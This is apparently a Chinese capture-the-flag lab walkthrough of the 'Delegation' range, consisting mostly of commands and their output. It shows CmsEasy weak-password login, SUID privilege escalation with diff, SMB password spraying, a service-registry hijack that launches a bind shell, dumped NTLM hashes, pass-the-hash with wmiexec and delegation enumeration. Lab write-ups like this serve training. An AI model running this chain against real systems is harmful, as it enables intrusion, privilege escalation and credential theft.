## 文章

https://fushuling.com/index.php/2023/09/24/%e6%98%a5%e7%a7%8b%e4%ba%91%e5%a2%83%c2%b7delegation/

https://exp10it.cn/2023/08/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-delegation-writeup/#flag01

## 打靶过程

`fscan`扫一下

```bash
fscan -h 
```

```
39.98.126.3:21 open
39.98.126.3:80 open
39.98.126.3:22 open
39.98.126.3:3306 open
[*] alive ports len is: 4
start vulscan
[*] WebTitle: http://39.98.126.3        code:200 len:68100  title:中文网页标题
```

80端口开了Web服务，打开进去是CmsEasy

后台登录界面可以查看到版本号 `V.7752`

![image-20231015085949679](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231015085949679.png)

弱密码 `admin/123456`登录后台

![image-20231015090155898](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231015090155898.png)

本地搜寻漏洞

![image-20231015090232792](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231015090232792.png)

有后台命令执行漏洞

![image-20231015154953596](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231015154953596.png)

```bash
172.22.4.36:21 open
172.22.4.36:80 open
172.22.4.36:22 open
172.22.4.36:3306 open
[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:中文网页标题
172.22.4.36:3306 open
172.22.4.45:445 open
172.22.4.19:445 open
172.22.4.45:139 open
172.22.4.19:139 open
172.22.4.7:139 open
172.22.4.45:135 open
172.22.4.19:135 open
172.22.4.7:135 open
172.22.4.45:80 open
172.22.4.36:80 open
172.22.4.36:22 open
172.22.4.36:21 open
172.22.4.7:445 open
172.22.4.7:88 open
[*] NetInfo:
[*]172.22.4.7
   [->]DC01
   [->]172.22.4.7
[*] NetBios: 172.22.4.45     XIAORANG\WIN19                 
[*] NetInfo:
[*]172.22.4.45
   [->]WIN19
   [->]172.22.4.45
[*] 172.22.4.7  (Windows Server 2016 Datacenter 14393)
[*] NetBios: 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393 
[*] NetBios: 172.22.4.7      [+]DC DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393 
[*] NetInfo:
[*]172.22.4.19
   [->]FILESERVER
   [->]172.22.4.19
[*] WebTitle: http://172.22.4.36        code:200 len:68100  title:中文网页标题
[*] WebTitle: http://172.22.4.45        code:200 len:703    title:IIS Windows Server
```

```
find / -user root -perm -4000 -print 2>/dev/null
```



```
/usr/bin/stapbpf
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/staprun
/usr/bin/diff
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
```

```bash
diff --line-format=%L /dev/null /home/flag/flag01.txt
```

```bash
flag01: flag{4795241f-3a7c-45c0-bcba-294468fc7319}
Great job!!!!!!
Here is the hint: WIN19\Adrian
I'll do whatever I can to rock you...

```

```bash
proxychains4 crackmapexec smb 172.22.4.45 -u 'Adrian' -p /usr/share/wordlists/rockyou.txt -d WIN19
```

```bash
SMB         172.22.4.45     445    WIN19            [-] WIN19\Adrian:babygirl1 STATUS_PASSWORD_EXPIRED 
```

```bash
proxychains4 rdesktop 172.22.4.45  -u Adrian -d WIN19 -p 'babygirl'
```

![image-20231015163708106](C:\Users\绮洛\AppData\Roaming\Typora\typora-user-images\image-20231015163708106.png)

```bash
reg add "HKLM\SYSTEM\CurrentControlSet\Services\gupdate" /t REG_EXPAND_SZ /v ImagePath /d "C:\Users\Adrian\Desktop\win_bind_x64.exe" /f
```

```bash
sc start gupdate
```

```bash
Adrian    WIN19     46f58bf00195cbd72dc0609a69309ff0  22bca2d6a211debb8b08a2ba918be82d9ad77078
WIN19$    XIAORANG  f311e68fd7304dc315a5df275993cf9a  ffb5f89f04b31a09ba9415be93f547532f8cdb22
WIN19$    XIAORANG  5943c35371c96f19bda7b8e67d041727  5a4dc280e89974fdec8cf1b2b76399d26f39b8f8


inistrator:500:aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab:::
Adrian:1003:aad3b435b51404eeaad3b435b51404ee:46f58bf00195cbd72dc0609a69309ff0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:44d8d68ed7968b02da0ebddafd2dd43e:::
```

```bash
 python wmiexec.py -hashes "aad3b435b51404eeaad3b435b51404ee:ba21c629d9fd56aff10c3e826323e6ab" administrator@172.22.4.45 -codec gbk
```

```bash
 python findDelegation.py xiaorang.lab/'WIN19$' -hashes :f311e68fd7304dc315a5df275993cf9a -dc-ip 172.22.4.7
```

```bash
Impacket v0.11.0 - Copyright 2023 Fortra

AccountName  AccountType  DelegationType  DelegationRightsTo
-----------  -----------  --------------  ------------------
DC01$        Computer     Unconstrained   N/A
WIN19$       Computer     Unconstrained   N/A
```

